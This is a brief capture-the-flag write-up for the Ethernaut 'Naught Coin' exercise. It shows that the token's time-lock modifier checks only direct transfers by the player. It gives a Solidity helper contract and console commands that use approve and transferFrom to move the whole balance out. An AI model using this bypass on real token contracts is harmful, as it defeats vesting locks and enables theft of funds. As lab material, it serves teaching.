### Goals

Set player balance to 0

### Exploit

We start with huge amount of tokens and need to get rid of them. But the tranfer function makes sure that it is only avaiable after 10 years, but it only checks this if the msg.sender is player so we will bypass this check.

```code
modifier lockTokens() {
    if (msg.sender == player) {
        require(block.timestamp > timeLock);
        _;
    } else {
        _;
    }
  }
```

### Code

Our balance is 1000000000000000000000000

Deploy basic contract in Remix

```code
contract NaughtyContract {
    function transfer(address token) public {
        token.call(abi.encodeWithSignature("transferFrom(address,address,uint256)", msg.sender, address(this), 1000000000000000000000000));
    }
}
```

Using Ethernuat console approve our helper contract to spend our tokens and call `NaughtContract::transfer()`

```
await contract.approve('0xc5D5300071980158cfEC7bBF154AA7edcc738cAA', 1000000000000000000000000)
await naught.transfer(NAUGHT_COIN_ADDRESS)
```

Done!
